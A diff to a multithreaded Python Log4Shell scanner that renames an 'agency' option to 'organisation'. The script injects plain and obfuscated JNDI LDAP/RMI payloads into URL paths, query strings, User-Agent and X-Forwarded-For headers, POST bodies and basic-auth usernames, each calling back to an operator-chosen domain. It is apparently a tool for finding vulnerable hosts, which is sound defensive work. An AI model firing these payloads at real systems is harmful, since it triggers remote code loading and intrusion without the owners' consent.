@@ -25,28 +25,28 @@ ips2scan = []
 tests = []
 
 # URLPath 
-tests += [{ "path" : "/${jndi:ldap://SITESPECIFIC-urlpath-AGENCY.DOMAIN/a}" } ]
+tests += [{ "path" : "/${jndi:ldap://SITESPECIFIC-urlpath-ORGANISATION.DOMAIN/a}" } ]
 
 # URLQuery
-tests += [{ "path" : "/?abc=${jndi:ldap://SITESPECIFIC-urlquery-AGENCY.DOMAIN/a}" } ]
+tests += [{ "path" : "/?abc=${jndi:ldap://SITESPECIFIC-urlquery-ORGANISATION.DOMAIN/a}" } ]
 
 # User Agent 
-tests += [{ "headers" : { 'User-Agent' : '${jndi:ldap://SITESPECIFIC-ua-AGENCY.DOMAIN/a}' } }]
+tests += [{ "headers" : { 'User-Agent' : '${jndi:ldap://SITESPECIFIC-ua-ORGANISATION.DOMAIN/a}' } }]
 
 # X-Forwarded-For 
-tests += [{ "headers" : { 'X-Forwarded-For' : '${jndi:ldap://SITESPECIFIC-ua-AGENCY.DOMAIN/a}' } }]
+tests += [{ "headers" : { 'X-Forwarded-For' : '${jndi:ldap://SITESPECIFIC-ua-ORGANISATION.DOMAIN/a}' } }]
 
 # User-Agent obfuscated
-tests += [{ "headers" : { "User-Agent" : "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-obfs-AGENCY.DOMAIN/poc}" } }]
+tests += [{ "headers" : { "User-Agent" : "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-obfs-ORGANISATION.DOMAIN/poc}" } }]
 
 # Post Payload URL encoded
-tests += [{ "postpayload" : "hobbit=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-postu-AGENCY.DOMAIN/poc}" }]
+tests += [{ "postpayload" : "hobbit=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-postu-ORGANISATION.DOMAIN/poc}" }]
 
 # Post payload JSON
-tests += [{ "postpayload" : '{"hobbit":"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-postj-AGENCY.DOMAIN/poc}"}' }]
+tests += [{ "postpayload" : '{"hobbit":"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-postj-ORGANISATION.DOMAIN/poc}"}' }]
 
 # Username basic auth
-tests += [{ "auth" : "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-basic-AGENCY.DOMAIN/poc}" }]
+tests += [{ "auth" : "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://SITESPECIFIC-basic-ORGANISATION.DOMAIN/poc}" }]
 
 ##################################
 
@@ -71,12 +71,12 @@ def processIps(ips):
 
 class ThreadScanner(threading.Thread):
 
-	def __init__(self, number, ports, agency, domain):
+	def __init__(self, number, ports, organisation, domain):
 
 		threading.Thread.__init__(self)
 		self.number = number
 		self.ports = ports
-		self.agency = agency
+		self.organisation = organisation
 		self.domain = domain
 
 	def run(self):
@@ -128,7 +128,7 @@ class ThreadScanner(threading.Thread):
 								headers = test["headers"]
 								for h in headers.keys():
 									headers[h] = headers[h].replace("SITESPECIFIC", specialsauce)
-									headers[h] = headers[h].replace("AGENCY", self.agency)
+									headers[h] = headers[h].replace("ORGANISATION", self.organisation)
 									headers[h] = headers[h].replace("DOMAIN", self.domain)
 							else:
 								headers = { "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" }
@@ -139,7 +139,7 @@ class ThreadScanner(threading.Thread):
 							success = False
 	
 							url = url.replace("SITESPECIFIC", specialsauce)
-							url = url.replace("AGENCY", self.agency)
+							url = url.replace("ORGANISATION", self.organisation)
 							url = url.replace("DOMAIN", self.domain)
 	
 							logging.info("Thread %s, %s - %s" % (self.number, ip, specialsauce))
@@ -149,7 +149,7 @@ class ThreadScanner(threading.Thread):
 								if "auth" in test:
 									mcuser = test["auth"]
 									mcuser = mcuser.replace("SITESPECIFIC", specialsauce)
-									mcuser = mcuser.replace("AGENCY", self.agency)
+									mcuser = mcuser.replace("ORGANISATION", self.organisation)
 									mcuser = mcuser.replace("DOMAIN", self.domain)
 									r = requests.get(url, timeout=10, verify=False, headers=headers, allow_redirects=False, auth=(mcuser, "fakepassword"))
 								else:
@@ -158,7 +158,7 @@ class ThreadScanner(threading.Thread):
 									else:
 										mcdata = test["postpayload"]
 										mcdata = mcdata.replace("SITESPECIFIC", specialsauce)
-										mcdata = mcdata.replace("AGENCY", self.agency)
+										mcdata = mcdata.replace("ORGANISATION", self.organisation)
 										mcdata = mcdata.replace("DOMAIN", self.domain)
 										r = requests.post(url, timeout=10, verify=False, headers=headers, allow_redirects=False, data=mcdata)
 								logging.debug(url)
@@ -194,14 +194,14 @@ class ThreadScanner(threading.Thread):
 if __name__ == '__main__':
 
 	parser = argparse.ArgumentParser(description="Scan a bunch of IPs with some JNDI paylods/tests", epilog="""EXAMPLE:
-		python3 jndiScanner.py -a pablo -i pabloTest.txt -d pablo.com -v
+		python3 jndiScanner.py -o pablo -i pabloTest.txt -d pablo.com -v
 	""",formatter_class=argparse.RawDescriptionHelpFormatter)
 	parser.add_argument('-i', '--ips', help='File with list of IPs or Hostnames to test, can be FQDN, IP or CIDR notation, one per line')
 	parser.add_argument('-t', '--threads', nargs='?', default='1', help="Number of Threads to run", type=int)
 	parser.add_argument('-v', '--verbose', action='store_true', help='verbose levels of logging', default=False)
 	parser.add_argument('-r', '--random', action='store_true', default=True, help='randomise order of IPs')
 	parser.add_argument('-n', '--port', help='What port numbers, to hit, commma seperated. Default: 80,443', default='80,443')
-	parser.add_argument('-a', '--agency', help='What agency')
+	parser.add_argument('-o', '--organisation', help='What Organisation')
 	parser.add_argument('-d', '--domain', help='What DNS domain')
 
 	args = parser.parse_args()
@@ -212,8 +212,8 @@ if __name__ == '__main__':
 	else:
 		logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 
-	if not args.agency:
-		logging.error("Put in an agency, fool")
+	if not args.organisation:
+		logging.error("Put in an ORGANISATION, fool")
 		sys.exit()
 
 	if not args.domain:
@@ -245,5 +245,5 @@ if __name__ == '__main__':
 
 	''' Now the magic '''
 	for i in range(args.threads):
-		ThreadScanner(i, args.port, args.agency, args.domain).start()
+		ThreadScanner(i, args.port, args.organisation, args.domain).start()
 
